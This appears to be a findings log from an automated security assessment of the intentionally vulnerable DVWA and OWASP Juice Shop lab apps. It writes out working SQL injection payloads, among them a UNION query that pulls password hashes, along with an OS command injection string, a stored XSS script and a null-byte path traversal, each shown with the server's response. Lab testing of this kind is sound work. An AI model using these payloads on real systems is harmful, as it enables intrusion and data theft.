findings.title: DVWA SQL Injection (GET id parameter) [security=low]
findings.response_evidence: [security=low] TRUE payload 1' OR '1'='1 -> HTTP 200, 5 records: ID 1' OR '1'='1 First name: admin Surname: admin; Gordon Surname: Brown; Hack Surname: Me; Pablo Surname: Picasso; Bob Surname: Smith. FALSE payload 1' AND '1'='2 -> HTTP 200, 'User ID:' result area empty (zero records). Surnames recovered: admin, Brown, Me, Picasso, Smith. SQLi DB: mysql.

findings.title: DVWA OS Command Injection (ip parameter) [security=low]
request_sequence: POST http://dvwa/vulnerabilities/exec/ form: ip=127.0.0.1; whoami&Submit=Submit (dvwa_admin, security=low)
findings.response_evidence: [security=low] HTTP 200. Ping output (4 packets, 0% loss) followed by the injected command output line: 'www-data' (appears immediately after 'rtt min/avg/max/mdev = 0.043/0.046/0.055/0.005 ms'). Web-process identity www-data confirmed.

findings.title: DVWA Stored XSS (mtxMessage guestbook) [security=low]
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form: txtName=xssverify, mtxMessage=<script id="test_token">window.xss_flag=1</script> (50 chars, exactly at maxlength, no truncation), btnSign=Sign Guestbook (dvwa_admin, security=low)
findings.response_evidence: [security=low] POST returned HTTP 200 and the guestbook stored a new entry 'Name: xssverify'. Canary length is exactly 50 chars so maxlength truncation did not occur. Rendering page loaded in dvwa_admin browser session (HTTP 200) and the stored script executed.

findings.title: [security=medium] SQL Injection (numeric boolean) in POST id on /vulnerabilities/sqli/
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> security level low, user_token f56dc55f...
POST http://dvwa/security.php security=medium&seclev_submit=Submit&user_token=[REDACTED] -> 302 (applied; re-GET shows 'Security level set to medium')
findings.response_evidence: [security=medium] TRUE payload id=1 OR 1=1 -> HTTP 200, page shows 5 records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id=1 AND 1=2 -> HTTP 200, 'User ID: 1 2 3 4 5' header only, zero records returned. Page footer shows 'Security Level: medium'. Behavioral difference confirms boolean SQLi in numeric POST id at medium.

findings.title: Login authentication bypass via SQL injection in email field of /rest/user/login
findings.response_evidence: HTTP 200 application/json: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. A valid JWT was issued for the first user admin@juice-sh.op (bid 1) without knowing the password, proving the email field is injectable into the login query.

findings.title: SQL injection in product search parameter q of /rest/products/search (error-based and UNION)
findings.response_evidence: Benign q=apple -> HTTP 200 {\"status\":\"success\",\"data\":[Apple Juice (1000ml) id 1, Apple Pomace id 24 with real names/prices]} (no error). Single quote q=qwert' -> HTTP 500 text/html 'Error: SQLITE_ERROR: near \"'%'\": syntax error'. UNION q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- -> HTTP 200 {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]}, where injected column values (2..9) are reflected in the product fields, proving UNION injection with 9 columns.

findings.title: DVWA SQL Injection via session-input.php id parameter [security=high]
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> page reports 'Security level is currently: medium'
POST http://dvwa/security.php security=high&seclev_submit=Submit&user_token=[REDACTED] -> 302; GET /vulnerabilities/sqli/ then shows 'Security Level: high'

POST http://dvwa/vulnerabilities/sqli/session-input.php id=1' OR '1'='1 #&Submit=Submit -> 200 'Session ID: 1' OR '1'='1 #'; GET /vulnerabilities/sqli/ -> 1 row: ID 1' OR '1'='1 # First name: admin Surname: admin
POST http://dvwa/vulnerabilities/sqli/session-input.php id=1' AND 1=0 UNION SELECT first_name, password FROM users #&Submit=Submit -> 200; GET /vulnerabilities/sqli/ -> 5 rows
findings.response_evidence: [security=high] Setting security to high succeeded (page shows 'Security Level: high'). TRUE payload id=1' OR '1'='1 # returned exactly one row (First name: admin, Surname: admin), consistent with the high-level LIMIT 1 clause. FALSE payload id=1' AND '1'='2 # returned zero records (no 'ID:' output). Because LIMIT 1 caps the boolean result at one row, a UNION was used to show multi-row data extraction: id=1' AND 1=0 UNION SELECT first_name, password FROM users # returned 5 rows: 'First name: admin Surname: 5f4dcc3b5aa765d61d8327deb882cf99', 'Gordon Surname: e99a18c428cb38d5f260853678922e03', 'Hack Surname: 8d3533d75ae2c3966d7e0d4fcc69216b', 'Pablo Surname: 0d107d09f5bbe40cade3de5c71e9e9b7', 'Bob Surname: 5f4dcc3b5aa765d61d8327deb882cf99'. Note: strict TRUE-vs-FALSE of multiple surnames was not achieved via the boolean payload alone (LIMIT 1); the injection is confirmed by TRUE/FALSE divergence and by multi-row UNION extraction of users table data.

findings.title: Poison null-byte path traversal bypasses /ftp/ extension filter to retrieve restricted package.json.bak
findings.response_evidence: Raw path: HTTP 403 body 'Error: Only .md and .pdf files are allowed!' (fileServer.js:55). Null-byte path: HTTP 200, content_type application/octet-stream, body begins with '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}' i.e. the restricted package.json.bak contents.

findings.title: Browsable /encryptionkeys/ directory exposes premium.key and jwt.pub
findings.response_evidence: HTTP 200 text/html directory listing: 'listing directory /encryptionkeys/ ... Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. Links to /encryptionkeys/jwt.pub and /encryptionkeys/premium.key present. Listing is browsable without authentication.

findings.title: Unauthenticated /api/Feedbacks returns feedback with partially masked author emails
findings.response_evidence: HTTP 200 application/json without authentication, status 'success', 8 records (UserId, id, comment, rating, createdAt, updatedAt). Comments carry author emails only in masked form: '(***in@juice-sh.op)', '(***@juice-sh.op)', '(***der@juice-sh.op)', '(***ereum@juice-sh.op)'; other records show '(anonymous)'. The full local part is never disclosed, so this is partial PII leakage (domain and fragment of local part), not full author email disclosure. Rated inconclusive pending a judgment on whether partial masking meets the CWE-359 bar.

findings.title: Confidential document exposed via open /ftp/ directory listing (acquisitions.md)
findings.response_evidence: Listing at /ftp/ (200 text/html) shows entry 'acquisitions.md 909 bytes'. Direct GET /ftp/acquisitions.md returned 200 text/markdown with body: '# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'

findings.title: BOLA: juiceshop_acct2 reads juiceshop_acct1's basket via GET /rest/basket/{id}
request_sequence: GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct1; own_basket_id=6, email acct1_bench@juiceshop.local)
GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct2; own_basket_id=7, email acct2_bench@juiceshop.local)
findings.response_evidence: acct1 own basket 6: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)","quantity":3 (BasketItem.quantity), "BasketId":6}]}}. acct2 GET /rest/basket/6 returned 200 with identical data: id 6, UserId 22 (acct1), Products: 'Apple Juice (1000ml)' BasketItem quantity 3. acct2 owns basket 7, so acct1's basket (distinct seeded item Apple Juice x3) was retrieved cross-user.

findings.title: CSRF on DVWA security-level change form: user_token enforced (no CSRF vulnerability)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> observed security level 'high' (not low as previously recorded), user_token=[REDACTED]
POST http://dvwa/security.php (dvwa_admin) form: security=low, seclev_submit=Submit (NO user_token) -> 302 back to security.php; GET shows level still 'high' and message 'CSRF token is incorrect'
POST http://dvwa/security.php (dvwa_admin) form: security=low, seclev_submit=Submit, user_token=[REDACTED] -> 302; GET shows 'Security level set to low', level now low
findings.response_evidence: Tokenless security change was rejected: page displayed 'CSRF token is incorrect' and security level remained 'high'. With the valid per-page user_token the same POST succeeded: 'Security level set to low' and 'Security level is currently: low'. The anti-CSRF token is validated server-side, so the form is not vulnerable to a token-less cross-origin request. Note: observed level at verification start was high (not low). Level was restored to low for downstream checks.

findings.title: Blind SQL Injection via id parameter (boolean-based) [security=low]
request_sequence: [security level check] GET http://dvwa/security.php (dvwa_admin) -> security_level: low
findings.response_evidence: [security=low] Confirmed level: security.php shows 'Security level is currently: low'. TRUE payload id=1' OR '1'='1 -> HTTP 200, body 'User ID exists in the database.' FALSE payload id=1' AND '1'='2 -> HTTP 404 (page-level), body 'User ID is MISSING from the database.' The TRUE/FALSE pair produces a reliable, injection-driven differential (exists vs missing). Caveat: this blind page renders only an existence message, not user surnames/IDs, so the 'records returned' criterion is not directly observable; the differential is the proof of injection.

findings.title: Raw-path control for /ftp/package.json.bak (null-byte bypass leg)
findings.response_evidence: HTTP 403. Body: 'Error: Only .md and .pdf files are allowed!' (Express fileServer.js:55). This is the expected control result for the raw path. The raw path alone is not a vulnerability; the bypass is covered by the existing confirmed finding for /ftp/package.json.bak%2500.md.

findings.title: Confidential acquisitions memo directly retrievable from open /ftp/ directory
request_sequence: GET http://juiceshop:3000/ftp/acquisitions.md with header Accept: text/html (unauth)
findings.response_evidence: HTTP 200, content-type text/markdown; charset=UTF-8. Body excerpt: '# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...' Confidential memo retrieved without authentication.

Remaining items are not worth the budget: /api/Feedbacks (CWE-359) is inconclusive and only partially masked emails were seen, so it is recorded as inconclusive rather than confirmed.
